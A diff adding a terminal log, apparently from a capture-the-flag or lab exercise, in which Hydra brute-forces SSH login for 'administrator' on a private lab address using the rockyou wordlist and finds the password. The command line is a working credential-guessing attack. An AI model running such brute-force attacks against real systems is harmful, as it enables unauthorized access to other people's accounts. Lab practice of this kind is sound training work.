@@ -1,0 +1,14 @@
+┌─[kali@kali]─[/tmp]
+└──╼ $hydra -l 'administrator' -P /usr/share/wordlists/rockyou.txt -t 20 10.10.225.86 ssh
+Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-05-14 15:05:43
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[DATA] max 20 tasks per 1 server, overall 20 tasks, 14344399 login tries (l:1/p:14344399), ~717220 tries per task
+[DATA] attacking ssh://10.10.225.86:22/
+[22][ssh] host: 10.10.225.86   login: administrator   password: alejandro
+1 of 1 target successfully completed, 1 valid password found
+[WARNING] Writing restore file because 6 final worker threads did not complete until end.
+[ERROR] 6 targets did not resolve or could not be connected
+[ERROR] 0 target did not complete
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-05-14 15:06:
